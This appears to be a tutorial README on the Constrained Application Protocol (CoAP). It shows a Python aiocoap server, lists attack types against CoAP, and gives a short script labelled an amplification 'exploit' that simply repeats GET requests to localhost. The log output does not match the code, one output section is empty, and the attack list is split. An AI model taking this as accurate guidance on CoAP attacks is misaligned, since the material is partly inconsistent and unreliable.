# Constrained Application Protocol (CoAP) 

## Installation
To install a CoAP (Constrained Application Protocol) server with logging enabled, Here are general steps for setting up a CoAP server using a popular library in Python called aiocoap, which is an asynchronous CoAP framework:

## Prerequisites
+ Python 3.7 or higher
+ pip (Python package installer)

## CoAP Server Installation
```python
import aiocoap.resource as resource
import aiocoap
import asyncio
import logging

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s:%(message)s')

class BasicResource(resource.Resource):
    async def render_get(self, request):
        logging.info("Received a GET request")
        return aiocoap.Message(payload=b"Hello World!")

root = resource.Site()
root.add_resource(['hello'], BasicResource())

async def main():
    protocol = await aiocoap.Context.create_server_context(root)
    logging.info("Server Started")
    await asyncio.get_running_loop().create_future()

if __name__ == "__main__":
    asyncio.run(main())
```
## Output
```bash
2024-04-22 10:33:11,725 DEBUG:Using selector: EpollSelector
2024-04-22 10:33:11,790 INFO:server listening on [::]:8683
2024-04-22 10:33:11,790 INFO:server listening on 0.0.0.0:8683
2024-04-22 10:33:11,794 DEBUG:Server ready to receive requests
2024-04-22 10:33:11,794 INFO:Server Started
```
# Attacks
For the Constrained Application Protocol (CoAP), various types of attacks are identified, as detailed in the provided document. Here's a list of attacks on the CoAP protocol:

1. **Regular Expression Denial of Service (ReDoS)**: This attack exploits inefficiencies in regular expression processing algorithms to create service denials.
   
2. **IP Address Spoofing**: This involves altering the sending IP address within UDP packets to impersonate another device or service.
   
3. **Replay Attacks**: This type of attack captures legitimate messages and resends them to perform unauthorized operations .
   
4. **Relay Attacks**: These attacks involve capturing and retransmitting messages in real-time, which can be used to bypass authentication mechanisms .
   
5. **Injection Attacks**: These occur by intercepting a TCP communication to inject malicious TCP segments into legitimate packets, carrying modified CoAP messages that interfere with server operations .
   
6. **CoAP Amplification DoS Attack**: Attackers send multiple CoAP GET requests to create large responses from small requests, thereby straining network resources and amplifying traffic .

## Exploit
```python
import asyncio
from aiocoap import *

async def main():
    context = await Context.create_client_context()
    for _ in range(100):
        request = Message(code=GET, uri="coap://127.0.0.1/amplifiable_resource")
        try:
            response = await context.request(request).response
            print('Result: %s\n%r' % (response.code, response.payload))
        except Exception as e:
            print('Failed to fetch resource:')
            print(e)
        await asyncio.sleep(1)

if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())
```
## Output

7. **Reflective Denial of Service (DoS)**: Employing legitimate requests to third-party servers that are then amplified and reflected back to the victim .

These attacks exploit various aspects of the CoAP protocol and its implementations, highlighting the importance of robust security measures to mitigate these threats.
